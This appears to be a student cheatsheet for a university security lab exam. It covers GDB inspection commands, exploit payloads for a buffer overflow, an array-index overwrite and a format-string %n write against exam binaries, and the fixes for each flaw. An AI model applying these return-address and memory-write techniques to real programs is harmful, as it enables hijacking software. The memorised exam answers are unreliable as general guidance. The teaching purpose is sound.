# GDB and Exam Commands Quick Reference

## Exam File Management

### Essential Commands
```bash
cd labexam/                    # Navigate to exam directory
vim exam.txt                   # Open exam file (or nano, gedit, etc.)
:w                            # Save in vim
:q                            # Quit vim
Ctrl+S                        # Save in most editors
ls -l exam.txt                # Verify file exists and check size
cp exam.txt exam_backup.txt   # Create backup copy
```

### Save Reminders
- Save after every answer
- Save every 5-10 minutes
- Save before running exploits
- Save before uploading

---

## GDB Basics

### Starting and Running
```bash
gdb ./program                 # Start gdb with program
gdb ./q1                      # Example: debug q1 executable
run                           # Run program
run 8                         # Run with argument "8"
set args 8                    # Set command-line arguments
continue (or c)               # Continue execution after breakpoint
quit (or q)                   # Exit gdb
```

### Breakpoints
```bash
break hanoi                   # Break at function hanoi
break 13                      # Break at line 13
break *0x8048356              # Break at memory address
break main                    # Break at main function
clear                         # Clear all breakpoints
clear 13                      # Clear breakpoint at line 13
info breakpoints              # List all breakpoints
delete 1                      # Delete breakpoint #1
```

### Stack and Frame Inspection
```bash
info frame                    # Show current frame (CRITICAL - shows saved eip, ebp)
info stack                    # Show call stack with all frames
info registers (or info reg) # Show all registers
info reg ebp                 # Show EBP register value
info reg eip                 # Show EIP register value
x/1wx $ebp+4                 # View return address (saved eip) at EBP+4
frame 0                      # Switch to frame 0 (current)
frame 1                      # Switch to frame 1 (caller)
```

### Memory Inspection
```bash
x/<count><format><size> <address>  # Examine memory
x/10i <address>            # Disassemble 10 instructions at address
x/3bx hanoi                # Show 3 bytes in hex at function hanoi
x/x <address>              # Show value at address in hex
x/s <address>              # Show as string
x/d <address>              # Show as decimal
x/wx <address>             # Show word (4 bytes) in hex
disassemble hanoi          # Disassemble function (or disas)
disassemble main           # Disassemble main function
disassemble /m hanoi       # Disassemble with source code mixed in
```

### Variable and Address Inspection
```bash
print n                     # Print variable value
print &n                    # Print variable address
print /d <value>            # Print as decimal
print /x <value>            # Print as hexadecimal
print /d 0x8048356          # Convert hex to decimal
p/d 0xffffd264-0xffffd318   # Calculate offset between addresses
p/d (0xffffd264-0xffffd318)/4  # Calculate offset and divide by 4
```

### Finding Addresses
```bash
print &rating               # Find address of variable rating
print &magic                # Find address of variable magic
print &values               # Find address of array values
print foo                   # Find address of function foo (same as &foo)
print &foo                  # Find address of function foo
x/10i main                  # See main function addresses
```

---

## Question Type: Stack Analysis (Section A)

### Common Workflow
```bash
gdb ./q1
break hanoi                 # Set breakpoint
run 8                       # Run with argument
info frame                  # Get saved eip, ebp addresses
info stack                  # See all stack frames
info reg ebp                # Get EBP value
p/d <addr1> - <addr2>       # Calculate offset
```

### Finding Return Address
```bash
break hanoi
run 8
info frame
# Look for: "saved eip = 0x8048390"
# Look for: "eip at 0xffffd2fc"
```

### Counting Stack Frames
```bash
break 13                    # Break at Point X
run 8
info stack                  # Count frames (#0, #1, #2, etc.)
```

### Calculating Byte Offsets
```bash
break main
break 13                    # Break at Point X
run 8
info reg ebp                # Get main's EBP: 0xffffd318
continue                    # Continue to Point X
info reg ebp                # Get hanoi's EBP: 0xffffd264
p/d 0xffffd264-0xffffd318   # Calculate: -180 bytes
# For int arrays: divide by 4 to get element count
```

### Assembly Analysis
```bash
disassemble hanoi           # See assembly for function
# Look for specific instructions at line 17
```

### Byte Encoding
```bash
x/3bx hanoi                # Show first 3 bytes of function
# Example output: 0x55 0x89 0xe5 (push ebp, mov ebp,esp)
```

---

## Question Type: Buffer Overflow (q2)

### Finding Target Address
```bash
gdb ./q2
disassemble main            # Find address of target instruction
# Look for instruction that prints magic string
# Example: 0x080483ee
```

### Testing Offset
```bash
# Test with pattern:
perl -e 'system "./q2", "A"x38 . "BBBB"'
# Run in gdb and check eip when crashes
# If eip = 0x42424242 (BBBB), offset is 38 bytes
# Adjust offset (36, 38, 40, 42) until eip matches
```

### Finding Offset in GDB
```bash
gdb ./q2
run $(perl -e 'print "A"x38 . "BBBB"')
# When crashes, check:
info reg eip                # Should show 0x42424242 if offset correct
```

### Final Exploit
```bash
# Method 1: Direct hex bytes
perl -e 'system "./q2", "A"x38 . "\xee\x83\x04\x08"'

# Method 2: Using pack (more reliable)
perl -e 'system "./q2", "A"x38 . pack("V", 0x080483ee)'
```

### Vulnerability Description
- Look for: `strcat(buffer, argv[1])` without size check
- Answer: "Line X: strcat(buffer, argv[1]) does not check input size, allowing buffer overflow"

### Fix Code
```c
// Option 1: strncat
strncat(buffer, argv[1], sizeof(buffer) - strlen(buffer) - 1);

// Option 2: snprintf
snprintf(buffer, sizeof(buffer), "%s%s", "Hello ", argv[1]);
```

---

## Question Type: Array Index Overflow (q3)

### Finding Function Address
```bash
gdb ./q3
print &foo                  # Get function address: 0x08048356
print /d 0x8048356          # Convert to decimal: 134513494
```

### Finding Array and Return Address
```bash
print &values               # Get array address: 0xffffcae0
info frame                  # Get return address location
# Look for: "saved eip at 0xffffd2ec"
```

### Calculating Index Offset
```bash
p/d 0xffffd2ec - 0xffffcae0  # Calculate byte offset: 2060
# Divide by 4 (int size): 2060/4 = 515
# So index 515 overwrites return address
```

### Exploit (stdin input)
```bash
perl -e 'print "515 134513494\n-1 1\n"' | ./q3
# Format: <index> <value>\n-1 1\n
# index = offset/4
# value = function address as decimal
```

### Vulnerability Description
- Look for: `values[index] = value;` without bounds check
- Answer: "Array access without index validation allows overwriting adjacent memory"

### Fix Code
```c
if (index < 0 || index >= 512) {
    return 0;
}
values[index] = value;
```

---

## Question Type: Format String (q4)

### Finding Variable Address
```bash
gdb ./q4
print &rating               # Get variable address: 0x804b018
```

### Finding Stack Position
```bash
# Test where input appears on stack:
perl -e 'system "./q4", "AAAA" . "%x.%x.%x.%x.%x.%x.%x.%x"'
# Look for 41414141 (AAAA in hex) in output
# Count position: 1st, 2nd, 3rd, etc. = stack position
# Example: if 5th position, use %5$n
```

### Calculating Padding
```bash
# Goal: Write 999 to rating
# Address bytes: 4 bytes (0x804b018)
# Prefix string: " has a rating: " = 16 characters
# Total so far: 4 + 16 = 20
# Padding needed: 999 - 20 = 979
# But format string adds more, so adjust: 995 is common
```

### Exploit
```bash
perl -e 'system "./q4", pack("V", 0x804b018) . "%995d%5$n"'
# Format: [address] + "%<padding>d%<position>$n"
# padding = 999 - address_bytes - prefix_length (adjust as needed)
# position = where input appears on stack
```

### Vulnerability Description
- Look for: `printf(argv[1])` or `printf(user_input)` without format string
- Answer: "printf(argv[1]) allows format string injection, enabling arbitrary memory writes"

### Fix Code
```c
printf("%s", argv[1]);      # Use format string
// OR
fputs(argv[1], stdout);     # Use fputs instead
```

---

## Question Type: Stack Protection (q5)

### Comparing Safe vs Unsafe
```bash
gdb ./safe
break foo
run
info frame                  # Note stack layout with canary

gdb ./unsafe
break foo
run
info frame                  # Note stack layout without canary
```

### Finding Canary
```bash
# In safe executable:
info frame                  # Look for canary location
x/x $ebp-4                  # Often canary is at EBP-4 or EBP-8
# Canary usually contains null byte (0x00) making it hard to forge
```

### Stack Frame Layout
```bash
info frame
# Note: saved registers, locals, arguments, canary location
# Compare layouts between safe and unsafe
```

---

## Perl Commands

### Basic Syntax
```bash
perl -e 'system "./program", "arg1", "arg2"'  # Command-line arguments
perl -e 'print "input\n"' | ./program          # stdin input
perl -e 'print "515 134513494\n-1 1\n"' | ./q3  # Multi-line stdin
```

### Pack Function (for addresses)
```bash
pack("V", 0x080483ee)      # Convert address to little-endian bytes
# "V" = 32-bit unsigned little-endian
# Result: "\xee\x83\x04\x08"
```

### String Repetition
```bash
"A"x38                     # 38 'A' characters
"A"x42 . "\xee\x83\x04\x08"  # Concatenation
```

### Special Characters
```bash
"\xee\x83\x04\x08"         # Hex bytes (little-endian address)
"\n"                       # Newline
"%5\$n"                    # Escaped $ for format string (use in single quotes)
```

---

## Useful Calculations

### Offset Calculations
```bash
# In gdb:
p/d <address1> - <address2>     # Calculate byte difference
p/d (0xffffd2ec - 0xffffcae0)/4  # Calculate and divide by 4 for int array
# Divide by 4 for int array index
# Divide by 1 for char array index
```

### Character Counting
```bash
echo -n "string" | wc -c        # Count characters
perl -e 'print length("string")'  # Count characters
```

### Address Conversions
```bash
# In gdb:
print /d 0x8048356        # Hex to decimal: 134513494
print /x 134513494       # Decimal to hex: 0x8048356
```

---

## Quick Reference by Question Type

### Stack Analysis (q1)
```bash
break <function>
run <arg>
info frame              # Get saved eip, ebp addresses
info stack              # See all stack frames
info reg ebp            # Get EBP value
p/d <addr1> - <addr2>   # Calculate offset
x/3bx <function>        # Get byte encoding
disassemble <function>  # See assembly
```

### Buffer Overflow (q2)
```bash
disassemble main        # Find target address
# Test offset: perl -e 'system "./q2", "A"xN . "BBBB"'
# Check eip in gdb - if 0x42424242, offset = N
perl -e 'system "./q2", "A"x38 . "\xee\x83\x04\x08"'
```

### Array Overflow (q3)
```bash
print &foo
print /d <foo_address>
print &values
info frame              # Get return address location
p/d <return_addr> - <values_addr>
# Divide by 4 for index
perl -e 'print "<index> <value>\n-1 1\n"' | ./q3
```

### Format String (q4)
```bash
print &rating
# Test: perl -e 'system "./q4", "AAAA" . "%x%x%x%x%x"'
# Find 41414141 in output = position
perl -e 'system "./q4", pack("V", 0x804b018) . "%995d%5$n"'
```

### Stack Protection (q5)
```bash
# Compare safe vs unsafe:
gdb ./safe
break foo
run
info frame

gdb ./unsafe
break foo
run
info frame
# Compare layouts, find canary
```

---

## Common Patterns

### Finding Return Address Location
```bash
info frame
# Look for: "saved eip at 0x..."
x/1wx $ebp+4            # Usually return address is at EBP+4
```

### Testing Buffer Overflow Offset
```bash
perl -e 'system "./prog", "A"xN . "BBBB"'
# Check eip when crashes - if 0x42424242, offset = N
# Adjust N (36, 38, 40, 42) until correct
```

### Format String Position Finding
```bash
perl -e 'system "./prog", "AAAA" . "%x%x%x%x%x"'
# Look for 41414141 in output = position number
# Count from first %x = position 1
```

---

## Critical Tips

1. **Always use `info frame`** - Shows saved eip, ebp, and frame layout
2. **Little-endian addresses** - Reversed: `0x080483ee` = `\xee\x83\x04\x08`
3. **Array index calculation** - Byte offset / sizeof(element)
   - int array: divide by 4
   - char array: divide by 1
4. **Format string basics**:
   - `%n` writes count of characters printed so far
   - `%x` reads and prints value from stack
   - `%5$n` writes to 5th argument on stack
5. **Test offsets incrementally** - Try 36, 38, 40, 42 bytes
6. **Use `pack("V", address)`** - More reliable than manual hex
7. **Save your work** - After every answer, every 5-10 minutes
8. **Show your work** - Include gdb commands/outputs for partial credit
9. **Time management** - Move on if stuck, return later
10. **Verify addresses** - Double-check hex to decimal conversions

---

## Exam Answer Format

### Standard Answer
```
* Answer: [Your answer here]
```

### Answer with Work
```
* Answer: saved eip = 0x8048390

(gdb) break hanoi
(gdb) run 8
(gdb) info frame
[gdb output here]
```

### Multi-line Answer
```
* Answer (max 3 lines):
Line 1 of answer
Line 2 of answer
Line 3 of answer
```

---

## Emergency Commands

### If Program Crashes
```bash
# In gdb, after crash:
info reg eip              # Check instruction pointer
info reg ebp              # Check base pointer
info frame                # Check current frame
backtrace (or bt)         # Show call stack
```

### If Stuck
```bash
# Leave placeholder in exam.txt:
* Answer: [TODO - return to this]

# Move to next question, return later
```

---

This cheatsheet covers all essential commands for the CSC1135 lab exam. Practice with the sample exam to become familiar with these commands!

